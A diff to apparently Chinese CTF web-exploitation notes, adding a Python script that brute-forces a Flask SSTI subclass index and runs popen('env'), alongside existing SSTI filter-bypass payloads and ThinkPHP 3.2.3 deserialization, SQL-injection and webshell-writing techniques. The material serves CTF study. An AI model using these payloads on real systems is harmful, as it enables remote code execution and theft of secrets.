@@ -91,6 +91,22 @@ for i in range(300,1000):
   - 最简单的getshell payload(配合eval): `__import__("os").popen("ls").read()`，来源:[[watevrCTF-2019]Supercalc](https://blog.csdn.net/a3320315/article/details/104272833)
   - 能发现flask注入需要大量`.`,`_`，如果被过滤了可以用`[]`替代`.`，16进制编码替代`_`。例如`{{()."__class__"."__bases__"[0]."__subclasses__"()[91]["get_data"](0, "/proc/self/fd/3")}}`绕过过滤的写法就是`{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}`。例题:[[pasecactf_2019]flask_ssti](https://blog.csdn.net/qq_40800734/article/details/107011638)
   - 有时候执行的命令在url里会被截断，可以通过传参的方式解决这个问题。`{{ "".__class__.__base__ .__subclasses__()[132].__init__.__globals__['popen'](request.args.get("cmd")).read()}}ge?cmd=cat /flag `
+  - 利用request.values绕过过滤。需要爆破索引
+    ```py
+    """ import requests 
+    for num in range(300): 
+        url = ""
+        d={"prefix":"{{","suffix":"}}","username":f"().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__({num}).__init__.__globals__.__getitem__(request.values.a)","a":"popen"}
+        res = requests.post(url,data=d).text 
+        if "popen" in res: 
+            print(num) 
+            break """
+    import requests 
+    url = ""
+    d={"prefix":"{{","suffix":"}}","username":f"().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(140).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()","a":"popen",'b':'env'}
+    res = requests.post(url,data=d).text 
+    print(res)
+    ```
 
 - [更多模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
@@ -2039,3 +2055,10 @@ def req(path):
 ```
 用udp传输http request需要多次执行，一次不一定能得到结果（服务器会返回200，但是没有实际body内容）。因为udp有很高的概率只传header但不传content body，导致request格式不对得不到返回结果。
 - 像这道题的情况也可以尝试发送一个`GET / HTTP/0.9`请求。HTTP/0.9是http的第一个版本，“It's a one-line protocol with no headers”。这个协议就不用担心udp不传body了，它只有一行，无需多次执行。
+226. [EasyTP](https://blog.csdn.net/RABCDXB/article/details/122264363)
+- thinkphp3.2.3反序列化pop链(sql注入&文件读取)：https://f5.pm/go-53579.html 。wp内包含报错注入，[开堆叠写shell](https://www.zhaoj.in/read-6859.html#WEB3_easytp)以及利用[rogue-mysql-server](https://github.com/allyshka/Rogue-MySql-Server):https://www.crisprx.top/archives/412#CTF_2021EasyTP 三种解法。注意事项：
+  - 需要已知sql数据库的名称及密码
+  - 最后一种解法需要公网ip
+  - 报错注入解法使用的updatexml最多只能显示32位，需要搭配substr，reverse或mid（跟substr感觉差不多）获取完整flag。
+  - 蚁剑版本不同，开堆叠写shell后连接sql数据库的结果也不同。蚁剑要是不行就用冰蝎的导出功能。
+- thinkphp可通过输入不存在的控制器获取版本。`http://xxx.com/index.php/aaa`
